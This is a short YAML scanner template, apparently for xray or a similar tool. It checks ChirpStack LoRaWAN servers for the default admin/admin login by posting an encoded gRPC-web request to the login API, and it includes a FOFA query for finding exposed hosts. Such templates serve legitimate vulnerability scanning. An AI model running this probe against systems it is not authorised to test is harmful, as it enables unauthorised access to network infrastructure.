id: poc-yaml-chirpstack-weak-password
info:
  name: chirpstack 弱口令漏洞
  severity: high
  tags:
  - 弱口令
  finger: chirpstack
  fofa: title="ChirpStack LoRaWAN"
requests:
- method: POST
  path: /api.InternalService/Login
  headers:
    Accept: application/grpc-web-text
    Content-Type: application/grpc-web-text
  data: AAAAAA4KBWFkbWluEgVhZG1pbg==
  expression: status_code == 200 && contains(body,"AAAAA") && !contains(body,"<")
    && contains(content_type,"application/grpc-web-text+proto")
variables: {}
transport: http
